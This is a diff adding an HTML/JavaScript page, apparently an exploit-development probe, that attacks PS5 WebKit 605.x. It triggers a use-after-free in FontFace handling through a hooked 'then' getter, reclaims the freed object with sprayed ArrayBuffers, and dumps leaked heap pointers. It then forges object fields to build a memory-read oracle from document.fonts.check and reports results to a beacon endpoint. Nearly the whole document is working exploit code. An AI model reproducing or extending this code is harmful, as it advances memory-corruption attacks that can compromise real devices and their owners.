@@ -1,0 +1,382 @@
+<!--
+  p816: Diagnostic probe — full buffer hex dump + property read test + oracle scan
+
+  Goal: Map the COMPLETE CSSFontFace layout on PS5 WebKit 605.x.
+  After UAF+spray, dump every 8-byte slot of every spray buffer that got
+  pointer values written by WebKit. Also test face property access and
+  oracle reads from various addresses.
+
+  NO RS scan. NO feng shui. Pure measurement.
+  CRASH_CLASS: LOW (read-only diagnostic)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p816 Diag</title></head>
+<body>
+<div id="verdict" style="position:sticky;top:0;z-index:9;font:700 15px monospace;padding:.5rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">RUNNING</div>
+<pre id="out" style="font:11px monospace;white-space:pre-wrap">p816 — diagnostic hex dump + property test</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+var UID=Math.random().toString(36).slice(2,8).toUpperCase();
+
+function b(m){try{O.textContent+='\n'+m;}catch(e){}
+  try{navigator.sendBeacon('/beacon/P816v2-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID);}catch(e){}}
+function bs(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/P816v2-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);x.send(null);}catch(e){try{b(m+'-XLOST');}catch(e2){}}}
+function verd(k,t){var v=document.getElementById('verdict');v.style.background=(k==='ok')?'#e3f5e6':'#fde2e1';v.style.color=(k==='ok')?'#0f5a20':'#8c1010';v.innerHTML=t;}
+
+function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
+var K=qint('k',32), PW=qint('pw',80);
+var SIZE=192, fired=false, faces=null;
+
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>>8)&0xFF;u[o+2]=(x>>>16)&0xFF;u[o+3]=(x>>>24)&0xFF;}
+function hex(x){if(typeof x==='bigint')return '0x'+x.toString(16);return '0x'+x.toString(16);}
+
+/* pre-UAF heap padding */
+var PAD_COUNT=64;
+var __pad=[];
+for(var pi=0;pi<PAD_COUNT;pi++){
+  var pb=new Uint8Array(new ArrayBuffer(SIZE));
+  pb[0]=0xDD;pb[1]=0xDD;
+  __pad.push(pb);
+}
+b('PAD-'+PAD_COUNT+'x'+SIZE);
+
+/* crash-loop guard */
+var CK='p816v1_tries';
+var MAX_TRIES=15,tries=0;
+try{tries=parseInt(localStorage.getItem(CK)||'0',10);}catch(e){}
+var GUARD_HALT=false;
+if(tries>=MAX_TRIES){GUARD_HALT=true;b('LOOP-GUARD-'+tries);verd('bad','CRASH LOOP ('+tries+')');
+  setTimeout(function(){try{localStorage.removeItem(CK);}catch(e){}location.replace('/?_='+Date.now());},8000);}
+else{
+  try{localStorage.setItem(CK,String(tries+1));}catch(e){}
+  b('VER-P816v2');b('BOOT-'+UID+',try='+(tries+1));
+}
+
+/* ============================================================
+   PHASE 1: UAF trigger + spray (same as p815)
+   ============================================================ */
+function start(){
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('NOVF');return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SIZE));
+      w[0x82]=3; // m_status = Success
+      w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;b('RES-n'+f.length);setTimeout(phase,PW);},
+                                               function(e){b('RJ-'+String(e&&e.name));});
+  setTimeout(function(){if(!faces)b('NOFACES');},1500);
+}
+
+/* ============================================================
+   PHASE 2: Full diagnostic
+   ============================================================ */
+function phase(){
+  /* --- Step A: Full hex dump of ALL buffers BEFORE modification --- */
+  var leakBufs=[]; // {idx, offsets: [{off, val}]}
+  var allLeaks=[];
+  var leakSet={};
+  var offsetMap={}; // offset → [values]
+  var allSlots=[]; // ALL non-zero slots for full dump
+
+  for(var i=0;i<window.__sp.length;i++){
+    var slots=[];
+    for(var off=0;off<SIZE;off+=8){
+      var v=le(window.__sp[i],off);
+      /* Check if this is a heap pointer (the important ones) */
+      if(v>0x1000000000n&&v<0x20000000000n){
+        slots.push({off:off,val:v});
+        var vs=v.toString(16);
+        if(!leakSet[vs]){leakSet[vs]=true;allLeaks.push(v);}
+        if(!offsetMap[off])offsetMap[off]=[];
+        offsetMap[off].push({buf:i,val:v});
+      }
+      /* Also track all non-zero values for full hex dump */
+      if(v!==0n)allSlots.push({buf:i,off:off,val:v});
+    }
+    if(slots.length>0)leakBufs.push({idx:i,slots:slots});
+  }
+
+  allLeaks.sort(function(a,b2){return a<b2?-1:a>b2?1:0;});
+  b('LEAKS-'+allLeaks.length+',bufs='+leakBufs.length);
+  if(allLeaks.length===0){b('NOLEAK');verd('bad','NOLEAK');
+    setTimeout(function(){location.replace(location.pathname+'?_='+Date.now());},3000);return;}
+
+  /* Report offset map: which offsets have heap pointers across all buffers */
+  var offKeys=Object.keys(offsetMap).map(Number).sort(function(a,b2){return a-b2;});
+  for(var oi=0;oi<offKeys.length;oi++){
+    var ok=offKeys[oi];
+    var vals=offsetMap[ok];
+    var uniq={};
+    for(var vi=0;vi<vals.length;vi++)uniq[vals[vi].val.toString(16)]=true;
+    var ukeys=Object.keys(uniq);
+    bs('OFF-0x'+ok.toString(16)+':n='+vals.length+',uniq='+ukeys.length+',PTR'
+       +',v='+ukeys.slice(0,3).map(function(s){return '0x'+s;}).join('/'));
+  }
+
+  /* Also report ALL non-zero 8B values in ALL buffers that have leaks */
+  for(var asi=0;asi<leakBufs.length;asi++){
+    var alb=leakBufs[asi];
+    bs('RAWBUF-'+alb.idx+':');
+    for(var ahi=0;ahi<SIZE;ahi+=8){
+      var ahv=le(window.__sp[alb.idx],ahi);
+      if(ahv!==0n)bs('RAW-'+alb.idx+'-0x'+ahi.toString(16)+'='+hex(ahv));
+    }
+  }
+
+  /* Full hex dump of first LEAK buffer (with heap pointers) */
+  if(leakBufs.length>0){
+    var lb=leakBufs[0];
+    bs('HEXBUF-idx='+lb.idx+',slots='+lb.slots.length);
+    var hexLine='';
+    for(var hi=0;hi<SIZE;hi+=8){
+      var hv=le(window.__sp[lb.idx],hi);
+      hexLine+=(hi>0?',':'')+'0x'+hi.toString(16)+':'+hex(hv);
+      if((hi%64===56)||hi===SIZE-8){
+        bs('HEX-'+lb.idx+'-'+hexLine);
+        hexLine='';
+      }
+    }
+  }
+
+  /* --- Step B: Find L1/L2 with proper offset tracking --- */
+  var L1=0n,L2=0n,L1off=-1,L2off=-1,leakIdx=-1;
+  for(var i2=0;i2<window.__sp.length;i2++){
+    for(var off2=0;off2<SIZE;off2+=8){
+      var v2=le(window.__sp[i2],off2);
+      if(v2>0x1000000000n&&v2<0x20000000000n){
+        if(leakIdx<0)leakIdx=i2;
+        if(leakIdx===i2){
+          if(L1===0n){L1=v2;L1off=off2;}
+          else if(L2===0n&&v2!==L1){L2=v2;L2off=off2;}
+        }
+      }
+    }
+  }
+  bs('L1='+hex(L1)+'@off=0x'+L1off.toString(16)+',L2='+hex(L2)+'@off=0x'+L2off.toString(16)+',buf='+leakIdx);
+
+  /* --- Step C: Forge for oracle mode --- */
+  for(var ib=0;ib<window.__sp.length;ib++){
+    var vb=window.__sp[ib];
+    vb[0]=0;vb[3]=0;put64(vb,0x08,L2);vb[0x10]=0;vb[0x82]=0;
+  }
+  b('FORGED');
+
+  setTimeout(function(){
+    for(var i3=0;i3<faces.length;i3++){try{faces[i3].family='zz'+i3;}catch(e){}}
+    b('FAMILY-OK');
+    setTimeout(function(){
+      for(var i4=0;i4<faces.length;i4++){try{document.fonts.add(faces[i4]);}catch(e){}}
+      b('ADD-OK');
+      setTimeout(function(){
+
+        var fam=null,zi=-1;
+        for(var q=0;q<faces.length;q++){var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){}if(r===false){fam='zz'+q;zi=q;window.__zi=q;break;}}
+        b('INTABLE-'+fam);
+        if(!fam){b('NOTIN');verd('bad','NOTIN');return;}
+        for(var is2=0;is2<window.__sp.length;is2++){window.__sp[is2][0x28]=1;window.__sp[is2][0x2C]=1;}
+
+        /* oracle functions */
+        function setR(t){for(var ir=0;ir<window.__sp.length;ir++){if(!window.__sp[ir])continue;put64(window.__sp[ir],0x20,t);}}
+        function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c))===false;}catch(e){return null;}}
+        function boundary(tgt){
+          setR(tgt);
+          if(chk(0)!==true)return -1;
+          var lo=0,hi=0x10FFFF,res=-1;
+          while(lo<=hi){var mid=(lo+hi)>>1;var r=chk(mid);if(r===null)break;if(r===true){res=mid;lo=mid+1;}else hi=mid-1;}
+          return res;
+        }
+
+        /* oracle validation */
+        var t1=-1,oracleOff=0n;
+        var OO_A=[];for(var oa=0;oa<=0x38;oa+=4)OO_A.push(BigInt(oa));
+        for(var oi2=0;oi2<OO_A.length;oi2++){
+          setR(L2+OO_A[oi2]);
+          if(chk(0)===true){t1=boundary(L2+OO_A[oi2]);if(t1>=0){oracleOff=OO_A[oi2];break;}}
+        }
+        var oracleAlive=(t1>=0);
+        for(var ipd=0;ipd<window.__sp.length;ipd++){var vpd=window.__sp[ipd];
+          vpd[0x38]=0x00;vpd[0x39]=0x10;vpd[0x3A]=0x00;vpd[0x3B]=0x00;
+          vpd[0x3C]=0x00;vpd[0x3D]=0x20;vpd[0x3E]=0x00;vpd[0x3F]=0x00;}
+
+        if(!oracleAlive){b('ORACLE-DEAD');verd('bad','ORACLE DEAD');
+          setTimeout(function(){location.replace(location.pathname+'?_='+Date.now());},2000);return;}
+        b('ORACLE-ALIVE-off='+hex(oracleOff)+',t1='+t1);
+
+        /* --- SELFIDX detection (same as p815) --- */
+        var selfIdx=-1;
+        setR(L2+oracleOff);
+        var bline=chk(t1);
+        for(var gk=0;gk<window.__sp.length;gk++)put32(window.__sp[gk],0x28,0);
+        var gkR=chk(t1);
+        for(var gk2=0;gk2<window.__sp.length;gk2++)put32(window.__sp[gk2],0x28,1);
+
+        if(bline===true&&gkR!==bline){
+          for(var sij=0;sij<window.__sp.length&&selfIdx<0;sij++){
+            put32(window.__sp[sij],0x28,0);
+            var tst=chk(t1);
+            put32(window.__sp[sij],0x28,1);
+            if(tst!==bline)selfIdx=sij;
+          }
+        }
+        if(selfIdx<0&&bline===true){
+          var altOff=(oracleOff===0n)?4n:0n;
+          setR(L2+altOff);
+          var altBl=chk(t1);
+          setR(L2+oracleOff);
+          if(altBl!==bline){
+            for(var sij2=0;sij2<window.__sp.length&&selfIdx<0;sij2++){
+              put64(window.__sp[sij2],0x20,L2+altOff);
+              var tst2=chk(t1);
+              put64(window.__sp[sij2],0x20,L2+oracleOff);
+              if(tst2!==bline)selfIdx=sij2;
+            }
+          }
+        }
+        b('SELFIDX-'+selfIdx);
+
+        if(selfIdx<0){b('NOSELF');verd('bad','NOSELF');
+          setTimeout(function(){location.replace(location.pathname+'?_='+Date.now());},2000);return;}
+
+        /* ============================================================
+           PHASE PROP: Property access test on face objects
+           Try reading various properties from the wrapped face to see
+           if they reflect C++ backing memory (not JS-cached).
+           ============================================================ */
+        bs('PROP-START,faces='+faces.length+',zi='+zi);
+        var props=['family','style','weight','stretch','unicodeRange','variant',
+                   'featureSettings','display','lineGapOverride','ascentOverride',
+                   'descentOverride','sizeAdjust'];
+        for(var pi2=0;pi2<faces.length;pi2++){
+          var propLine='F'+pi2+':';
+          for(var pp=0;pp<props.length;pp++){
+            try{
+              var pv=faces[pi2][props[pp]];
+              var pvs=String(pv);
+              if(pvs.length>30)pvs=pvs.substring(0,30)+'...';
+              propLine+=props[pp][0]+props[pp][1]+'='+pvs+',';
+            }catch(e){propLine+=props[pp][0]+props[pp][1]+'=ERR,';}}
+          bs('PROP-'+propLine);
+        }
+
+        /* ============================================================
+           PHASE OREAD: Oracle reads at various target addresses
+           Test if we can read from L1, L2, and compute values from them.
+           ============================================================ */
+        bs('OREAD-START');
+
+        /* Read at L1 and nearby offsets */
+        var readTargets=[
+          ['L1+0',L1],['L1+4',L1+4n],['L1+8',L1+8n],['L1+0x10',L1+0x10n],
+          ['L2+0',L2],['L2+4',L2+4n],['L2+8',L2+8n],['L2+0x10',L2+0x10n]
+        ];
+
+        /* Also try reading from each leaked pointer offset in the buffer */
+        for(var ri=0;ri<leakBufs.length&&ri<1;ri++){
+          for(var rj=0;rj<leakBufs[ri].slots.length;rj++){
+            var rs=leakBufs[ri].slots[rj];
+            if(rs.val>0x1000000000n&&rs.val<0x20000000000n){
+              readTargets.push(['buf'+leakBufs[ri].idx+'+0x'+rs.off.toString(16)+'→',rs.val]);
+              readTargets.push(['buf'+leakBufs[ri].idx+'+0x'+rs.off.toString(16)+'→+8',rs.val+8n]);
+            }
+          }
+        }
+
+        for(var rt=0;rt<readTargets.length;rt++){
+          var label=readTargets[rt][0];
+          var addr=readTargets[rt][1];
+          var rd=boundary(addr);
+          bs('OREAD-'+label+'('+hex(addr)+')='+rd+(rd>=0?' (0x'+rd.toString(16)+')':''));
+        }
+
+        /* ============================================================
+           PHASE SAFE-RD: Read L1/L2 object fields via oracle
+           boundary() max is 0x10FFFF (21 bits) — cannot read pointers.
+           But CAN read small int fields (sizes, counts, flags, enum values).
+           Only read small ranges to avoid hitting unmapped pages.
+           ============================================================ */
+        bs('SAFE-RD-START');
+        var safeRanges=[
+          ['L1',L1,0,0x20],['L2',L2,0,0x20]
+        ];
+        for(var sr=0;sr<safeRanges.length;sr++){
+          var srl=safeRanges[sr][0],srb=safeRanges[sr][1],srs=safeRanges[sr][2],sre=safeRanges[sr][3];
+          for(var sro=srs;sro<sre;sro+=4){
+            var srv=boundary(srb+BigInt(sro));
+            bs('RD-'+srl+'+0x'+sro.toString(16)+'='+(srv>=0?srv+' (0x'+srv.toString(16)+')':'-1'));
+          }
+        }
+
+        /* ============================================================
+           PHASE LOAD: Try document.fonts.load() AGAIN to see if it
+           triggers wrapper repopulation writes into our buffer
+           ============================================================ */
+        bs('LOAD-TEST-START');
+        /* Snapshot the buffer before load */
+        var preLoad=new Uint8Array(SIZE);
+        preLoad.set(window.__sp[selfIdx]);
+
+        try{
+          document.fonts.load('1em '+fam,'A').then(function(){
+            /* Compare buffer after load */
+            var diffs=[];
+            for(var di=0;di<SIZE;di++){
+              if(window.__sp[selfIdx][di]!==preLoad[di]){
+                diffs.push({off:di,pre:preLoad[di],post:window.__sp[selfIdx][di]});
+              }
+            }
+            bs('LOAD-DIFFS-'+diffs.length);
+            for(var dd=0;dd<Math.min(diffs.length,20);dd++){
+              bs('LOAD-D:off=0x'+diffs[dd].off.toString(16)+',pre='+diffs[dd].pre+',post='+diffs[dd].post);
+            }
+            if(diffs.length>0){
+              /* Something changed! Dump the new values at changed offsets as 8B */
+              for(var dd2=0;dd2<diffs.length;dd2+=8){
+                var da=diffs[dd2].off&~7;
+                var nv=le(window.__sp[selfIdx],da);
+                bs('LOAD-NEW:off=0x'+da.toString(16)+'='+hex(nv));
+              }
+            }
+            finalReport();
+          },function(e){bs('LOAD-ERR-'+String(e&&e.name));finalReport();});
+        }catch(e){bs('LOAD-THROW-'+e);finalReport();}
+
+      },60);
+    },40);
+  },60);
+
+  function finalReport(){
+    try{localStorage.removeItem(CK);}catch(e){}
+    var summary='leaks='+allLeaks.length+',L1off=0x'+L1off.toString(16)+',L2off=0x'+L2off.toString(16)+',selfIdx='+selfIdx;
+    bs('RESULT:'+summary);
+    b('RESULT:'+summary);
+    verd('ok','DIAG COMPLETE — '+summary);
+    /* Do NOT auto-retry — we want to read the results */
+  }
+}
+
+if(!GUARD_HALT){
+if(document.readyState==='complete'||document.readyState==='interactive')
+  setTimeout(start,2000);
+else
+  window.addEventListener('DOMContentLoaded',function(){setTimeout(start,2000);});
+}
+</script>
+</body></html>
